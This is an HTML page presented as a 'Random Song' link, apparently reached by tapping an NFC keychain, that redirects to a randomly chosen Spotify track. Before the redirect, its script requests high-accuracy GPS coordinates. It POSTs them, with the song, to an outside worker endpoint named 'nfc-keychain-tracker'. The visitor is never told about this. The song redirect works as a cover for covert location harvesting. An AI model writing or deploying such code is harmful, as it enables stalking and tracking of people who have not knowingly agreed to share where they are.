<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Random Song</title>

<script>

// ==========================================
// CONFIGURATION
// ==========================================

const WORKER_URL =
  "https://nfc-keychain-tracker.meyarirangkeychain.workers.dev/";

// ==========================================
// SONG LIST
// ==========================================

const songs = [
    "https://open.spotify.com/track/2rKkfc4VZ74FQDc1FF1Zo6?si=3a8d82e6ae8241c1",
    "https://open.spotify.com/track/20dAJsyno9ZoBLJtqgQnUI?si=28f3982153484ff6",
    "https://open.spotify.com/track/5tg21NdePCn5m8F9BXOEeJ?si=8189ffbcd1334276",
    "https://open.spotify.com/track/0KmrKOdScRDVYwWS8hkkdv?si=0cac509da26446d9",
    "https://open.spotify.com/track/3bmpXHVie1GTy37OkXJ7Vc?si=c49aeb879bea4347",
    "https://open.spotify.com/track/3plyGpDgzfrnZbpElpfioV?si=7fb6e7eb18ea4ffd",
    "https://open.spotify.com/track/68lbSrXDORS51pmyjZv712?si=b3b823e007b24dca",
    "https://open.spotify.com/track/3VegC0PZiHjGxb80DER8XU?si=861c50fe944b46e9",
    "https://open.spotify.com/track/4B4Q7zfd0aHcuhQBfCRnH5?si=311407709d5e4baf",
    "https://open.spotify.com/track/2IFND3phjzIG1RcPnHh2hP?si=6c5b004c30b54561",
    "https://open.spotify.com/track/0b61A7v9agI08BG21jJPQ9?si=63a6d35aa8ea4151",
    "https://open.spotify.com/track/6s3w7SUVtmm68Bw5KrKMh0?si=418819417f684d1d",
    "https://open.spotify.com/track/1XpVhaI4HzWrhRWIpdfyJB?si=63e6f4634ca04d1a",
    "https://open.spotify.com/track/1ZNolq7VI7efGlh2hb2VVr?si=1b7732c20647402e"
];

// ==========================================
// RANDOM SONG SELECTION
// ==========================================

const randomIndex =
  Math.floor(Math.random() * songs.length);

const selectedSong =
  songs[randomIndex];

// ==========================================
// SEND DATA TO WORKER
// ==========================================

function sendData(data) {

  fetch(WORKER_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  }).catch(err => {
    console.log("Tracking failed", err);
  });

}

// ==========================================
// REDIRECT
// ==========================================

function goToSpotify() {

  window.location.replace(selectedSong);

}

// ==========================================
// SUCCESS GPS
// ==========================================

function gpsSuccess(position) {

  sendData({

    page: "random",

    song: selectedSong,

    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy

  });

  setTimeout(goToSpotify, 500);

}

// ==========================================
// GPS ERROR
// ==========================================

function gpsError() {

  sendData({

    page: "random",
    song: selectedSong

  });

  setTimeout(goToSpotify, 500);

}

// ==========================================
// START
// ==========================================

navigator.geolocation.getCurrentPosition(
  gpsSuccess,
  gpsError,
  {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0
  }
);

</script>

</head>

<body>

  

</body>
</html>
